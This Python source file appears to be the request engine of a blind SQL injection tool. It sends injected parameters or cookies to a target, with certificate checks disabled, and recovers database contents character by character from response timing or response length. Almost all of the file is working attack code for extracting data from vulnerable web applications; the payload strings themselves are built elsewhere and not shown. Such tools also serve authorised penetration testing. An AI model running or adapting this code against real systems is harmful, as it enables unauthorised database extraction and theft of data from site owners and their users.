from urllib.parse import urlencode
from urllib3.exceptions import InsecureRequestWarning
import code.utils as utils
import requests
import asyncio
import aiohttp
import time


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# ---------------------------------------- GLOBALS 
def send_sync_request(URL: str, METHOD: str, cookie: str, data: dict) -> int:
    headers = {"Cookie": "" if not cookie else cookie}
    headers.update(utils.HEADERS)
    proxy = {
        'http': utils.ARGS.proxy,
        'https': utils.ARGS.proxy
    }

    full_url = URL
    encoded_data = urlencode(data)
    if METHOD == "GET":
        full_url = f"{URL}?{encoded_data}"
        response = requests.get(full_url, headers=headers, proxies=proxy, verify=False)
    elif METHOD == "POST":
        response = requests.post(full_url, data=data, headers=headers, proxies=proxy, verify=False)

    utils.QUERY_COUNT += 1
    request = {
        "method": response.request.method,
        "url": response.request.url,
        "headers": dict(response.request.headers),
        "data": encoded_data if METHOD == "POST" else "",
    }
    response = {
        "status": response.status_code,
        "headers": dict(response.headers),
        "data": response.text,
    }
    return request, response


async def send_async_request(session, URL: str, METHOD: str, cookie: str, data: dict) -> int:
    cookie = "" if not cookie else cookie
    full_url = URL
    encoded_data = urlencode(data)
    if METHOD == "GET":
        full_url = f"{URL}?{encoded_data}"
        request = session.get(full_url, headers={'Cookie': cookie}, proxy=utils.ARGS.proxy)
    elif METHOD == "POST":
        request = session.post(full_url, data=data, headers={'Cookie': cookie}, proxy=utils.ARGS.proxy)
    async with request as response:
        request = {
            "method": response.request_info.method,
            "url": response.request_info.url,
            "headers": dict(response.request_info.headers),
            "data": encoded_data if METHOD == "POST" else "",
        }
        response = {
            "status": response.status,
            "headers": dict(response.headers),
            "data": await response.text(),
        }
        return request, response


# ---------------------------------------- TIMED BLIND SQLi 
def prepare_sync_requests_T(URL: str, METHOD: str, static_data, injected_arr: list, SQLtype) -> str:
    reference = -1
    arr_time_responses = []
    for i, data in enumerate(injected_arr):
        total = 0
        start = time.time()
        if SQLtype == "HTTP":
            cookie = static_data
            http_params = data
            request, response = send_sync_request(URL, METHOD, cookie, http_params)

        elif SQLtype == "Cookie":
            http_params = static_data
            cookie = data
            request, response = send_sync_request(URL, METHOD, cookie, http_params)
        total = round(time.time()-start, 2)
        arr_time_responses.append(total)
        if i == 3:
            reference = utils.select_reference_time(arr_time_responses)
            for idx, time_resp in enumerate(arr_time_responses):
                if time_resp >= reference:
                    return utils.ALPHABET[idx]
        elif i > 3 and total >= reference:
            return utils.ALPHABET[i]
        if utils.ARGS.delay:
            time.sleep(float(utils.ARGS.delay))
    if utils.QUERY_COUNT <= len(utils.ALPHABET):
        # We still on first char which means there is a problem in the query
        print("[warning] Something went wrong:")
        print(f"HTTP Request:\n{utils.print_request(request)}")
        print("\n-------\n")
        print(f"HTTP Response:\n{utils.print_response(response)}")
    return None


async def prepare_async_requests_T(URL: str, METHOD: str, static_data, injected_arr: list, SQLtype) -> str:

    async def __send_async_requests_T(session, URL: str, METHOD: str, cookie: str, data: dict) -> float:
        start = time.time()
        request, response = await send_async_request(session, URL, METHOD, cookie, data)
        return round(time.time()-start, 2), request, response

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), headers=utils.HEADERS) as session:
        if SQLtype == "HTTP":
            # SQLi in HTTP parameters
            cookie = static_data
            tasks = [__send_async_requests_T(session, URL, METHOD, cookie, http_params) for http_params in injected_arr]
        elif SQLtype == "Cookie":
            # SQLi in cookies
            http_params = static_data
            tasks = [__send_async_requests_T(session, URL, METHOD, cookie, http_params) for cookie in injected_arr]
        tasks_output = await asyncio.gather(*tasks)
    utils.QUERY_COUNT += len(utils.ALPHABET)
    arr_time_responses, arr_requests, arr_responses = list(zip(*tasks_output))
    reference = utils.select_reference_time(arr_time_responses)
    for idx, time_resp in enumerate(arr_time_responses):
        if time_resp >= reference:
            return utils.ALPHABET[idx]
    if utils.QUERY_COUNT <= len(utils.ALPHABET):
        # We still on first char which means there is a problem in the query
        print("[warning] Something went wrong:")
        print(f"HTTP Request:\n{utils.print_request(arr_requests[0])}")
        print("\n-------\n")
        print(f"HTTP Response:\n{utils.print_response(arr_responses[0])}")
    return None


# ---------------------------------------- BASIC AND ERROR BLIND SQLi 
def prepare_sync_requests_BE(URL: str, METHOD: str, static_data, injected_arr: list, SQLtype) -> str:
    reference = -1
    arr_len_responses = []
    for i, data in enumerate(injected_arr):
        if SQLtype == "HTTP":
            cookie = static_data
            http_params = data
            request, response = send_sync_request(URL, METHOD, cookie, http_params)
        elif SQLtype == "Cookie":
            http_params = static_data
            cookie = data
            request, response = send_sync_request(URL, METHOD, cookie, http_params)
        arr_len_responses.append(len(response['data']))
        if i == 3:
            reference = utils.select_reference_len(arr_len_responses)
        if i > 3:
            for idx, len_resp in enumerate(arr_len_responses):
                if len_resp != reference:
                    return utils.ALPHABET[idx]
        if utils.ARGS.delay:
            time.sleep(float(utils.ARGS.delay))
    if utils.QUERY_COUNT <= len(utils.ALPHABET):
        # We still on first char which means there is a problem in the query
        print("[warning] Something went wrong:")
        print(f"HTTP Request:\n{utils.print_request(request)}")
        print("\n-------\n")
        print(f"HTTP Response:\n{utils.print_response(response)}")
    return None


async def prepare_async_requests_BE(URL: str, METHOD: str, static_data, injected_arr: list, SQLtype) -> str:
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), headers=utils.HEADERS) as session:
        if SQLtype == "HTTP":
            # SQLi in HTTP parameters
            cookie = static_data
            tasks = [send_async_request(session, URL, METHOD, cookie, http_params) for http_params in injected_arr]
        elif SQLtype == "Cookie":
            # SQLi in cookies
            http_params = static_data
            tasks = [send_async_request(session, URL, METHOD, cookie, http_params) for cookie in injected_arr]
        tasks_output = await asyncio.gather(*tasks)
    utils.QUERY_COUNT += len(utils.ALPHABET)
    arr_requests, arr_responses = list(zip(*tasks_output))
    arr_len_responses = [len(response['data']) for response in arr_responses]
    reference = utils.select_reference_len(arr_len_responses)
    for idx, len_resp in enumerate(arr_len_responses):
        if len_resp != reference:
            return utils.ALPHABET[idx]
    if utils.QUERY_COUNT <= len(utils.ALPHABET):
        # We still on first char which means there is a problem in the query
        print("[warning] Something went wrong:")
        print(f"HTTP Request:\n{utils.print_request(arr_requests[0])}")
        print("\n-------\n")
        print(f"HTTP Response:\n{utils.print_response(arr_responses[0])}")
    return None
